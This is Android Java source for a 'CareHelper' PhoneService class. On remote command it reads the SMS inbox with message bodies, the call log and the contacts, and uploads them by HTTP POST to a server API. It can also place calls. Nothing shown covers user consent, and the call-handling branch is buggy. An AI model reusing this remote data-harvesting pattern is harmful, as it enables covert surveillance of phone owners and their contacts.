package org.bert.carehelper.service;

import static android.content.Context.BATTERY_SERVICE;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.alibaba.fastjson2.JSON;

import org.bert.carehelper.common.API;
import org.bert.carehelper.common.CareHelperContext;
import org.bert.carehelper.common.CommandType;
import org.bert.carehelper.entity.CallLogInfo;
import org.bert.carehelper.entity.CommandResponse;
import org.bert.carehelper.entity.Contact;
import org.bert.carehelper.http.HTTPConnection;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.ThreadPoolExecutor;

/**
 * 手机相关服务
 * 需要获取相关权限
 */
public class PhoneService implements Service  {

    private Context context;

    private ContentResolver cr = null;

    private final String TAG = "PhoneService";

    private ThreadPoolExecutor threadPool = null;
    private CareHelperContext careHelperContext = CareHelperContext.getInstance();


    public PhoneService(Context context) {
        this.context = context;
        this.threadPool = CareHelperContext.getInstance().getThreadPoolExecutor();
        if (context != null) {
            this.cr = this.context.getContentResolver();
        } else {
            Log.e("PhoneService", "context is null!");
        }
    }

    /**
     * 获取电话号码
     *
     * @return
     */
    public String getPhoneNumber() {
        TelephonyManager telephonyManager = (TelephonyManager) this.context
                .getSystemService(Context.TELEPHONY_SERVICE);
        String phoneNumber = null;
        if (ActivityCompat.checkSelfPermission(this.context,
                Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
                && ActivityCompat.checkSelfPermission(this.context,
                Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this.context, Manifest.permission.READ_PHONE_STATE)
                        != PackageManager.PERMISSION_GRANTED) {
            return "000-0000-0000";
        }
        phoneNumber = telephonyManager.getLine1Number();//返回设备的电话号码
        Log.i(TAG, "Get Tel Numbers " + phoneNumber);
        return phoneNumber;
    }

    public String getDeviceId() {
        TelephonyManager telephonyManager = (TelephonyManager) this.context
                .getSystemService(Context.TELEPHONY_SERVICE);
        return "";
    }


    /**
     * 获取短信列表
     */
    public List<Map<String, String>> getPhoneMessageList() {
        List<Map<String, String>> list = new LinkedList<>();
        Uri SMS_INBOX = Uri.parse("content://sms/inbox");
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        Cursor cur = this.cr.query(SMS_INBOX, projection, null, null, "date desc");
        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));//手机号
            String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
            String body = cur.getString(cur.getColumnIndex("body"));//短信内容
            //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
            Map<String, String> map = new HashMap<String, String>();
            map.put("phone", number);
            map.put("message", body);
            list.add(map);
        }
        return list;
    }

    /**
     * 获取通讯记录
     */
    public List<CallLogInfo> getPhoneRecords() {
        List<CallLogInfo> infos = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();
        Uri uri = CallLog.Calls.CONTENT_URI;
        String[] projection = new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DATE,
                CallLog.Calls.TYPE};
        Cursor cursor = cr.query(uri, projection, null, null, null);
        while (cursor.moveToNext()) {
            String number = cursor.getString(0);
            long date = cursor.getLong(1);
            int type = cursor.getInt(2);
            infos.add(new CallLogInfo(number, date, type));
        }
        cursor.close();
        return infos;
    }

    /**
     * 获取联系人列表
     */
    public List<Contact> getContactList() {
        Cursor cursor = this.cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{"display_name", "sort_key", "contact_id",
                        "data1"}, null, null, null);
        List<Contact> list = new ArrayList<>();
        while (cursor.moveToNext()) {
            Contact contact = new Contact();
            //读取通讯录的姓名
            String name = cursor.getString(cursor
                    .getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            //读取通讯录的号码
            String number = cursor.getString(cursor
                    .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            contact.setPhone(number);
            contact.setName(name);
            list.add(contact);
        }
        cursor.close();
        return list;
    }

    /**
     * STREAM_ALARM 警报
     * STREAM_MUSIC 音乐回放即媒体音量
     * STREAM_NOTIFICATION 窗口顶部状态栏Notification,
     * STREAM_RING 铃声
     * STREAM_SYSTEM 系统
     * STREAM_VOICE_CALL 通话
     * STREAM_DTMF 双音多频,不是很明白什么东西
     */
    public void setVolum(int audioType, int volume) {
        //获取系统的Audio管理者
        AudioManager mAudioManager = (AudioManager) this.context.getSystemService(Context.AUDIO_SERVICE);
        //最大音量
        int maxVolume = mAudioManager.getStreamMaxVolume(audioType);
        //当前音量
        int currentVolume = mAudioManager.getStreamVolume(audioType);
        System.out.println(currentVolume);
        mAudioManager.setStreamVolume(audioType, volume, AudioManager.FLAG_SHOW_UI);
    }

    public void setMaxVolum() {
        //获取系统的Audio管理者
        AudioManager mAudioManager = (AudioManager) this.context.getSystemService(Context.AUDIO_SERVICE);
        //最大音量
        int maxVolume = mAudioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        mAudioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, AudioManager.FLAG_SHOW_UI);
    }

    /**
     * 获取电量
     */
    public void getElectricity() {
        BatteryManager batterymanager = (BatteryManager) this.context.getSystemService(BATTERY_SERVICE);
        batterymanager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        Log.e("batterymanager",+batterymanager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)+"%");
    }

    /**
     * 拨打电话
     * @param phoneNum  电话号码
     */
    public void phoneCall(String phoneNum) {
        Intent intent = new Intent(Intent.ACTION_CALL);
        Uri data = Uri.parse("tel:" + phoneNum);
        intent.setData(data);
        this.context.startActivity(intent);
    }


    @Override
    public CommandResponse doCommand(String type) {
        CommandResponse response = new CommandResponse();
        response.setPhone(this.getPhoneNumber());
        response.setToken(this.careHelperContext.getEnvironment().getToken());
        String[] strings = type.split(":");
        if (strings.length < 2) {
            Log.e(TAG, "commands error!");
            return response;
        }
        switch (strings[1]) {
            case CommandType.CALL_PHONE:
                if (strings.length >= 3) {
                    String phoneNumber = type.split(":")[1];
                    phoneCall(phoneNumber);
                    response.setMessage("exec success");
                    response.setStatus(0);
                } else {
                    phoneCall("000-0000-0000");
                    response.setMessage("command error");
                    response.setStatus(1);
                }
                break;
            case CommandType.CONTACT_LIST:
                List<Contact> contacts = getContactList();
                String contactsStr = JSON.toJSONString(contacts);
                response.setMessage(contactsStr);
                response.setStatus(0);
                break;
            case CommandType.PHONE_RECORDS:
                List<CallLogInfo> records = getPhoneRecords();
                String recordsStr = JSON.toJSONString(records);
                response.setMessage(recordsStr);
                response.setStatus(0);
                break;
            case CommandType.PHONE_MESSAGE_LIST:
                List<Map<String, String>> maps = getPhoneMessageList();
                String mapsStr = JSON.toJSONString(maps);
                response.setMessage(mapsStr);
                response.setStatus(0);
                break;
            case CommandType.MAX_VOLUM:
                setMaxVolum();
                response.setMessage("exec success");
                response.setStatus(0);
                break;
        }
        try {
            Log.i(TAG, "commands exec success, wait 4 sec to do upload task!");
            Thread.sleep(4000);
            this.threadPool.execute(()->{
                Log.i(TAG, "doing upload task！");
                new HTTPConnection(
                        API.API_COMMAND + "/receive",
                        response,
                        "POST"
                ).run();
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
        return response;
    }
}
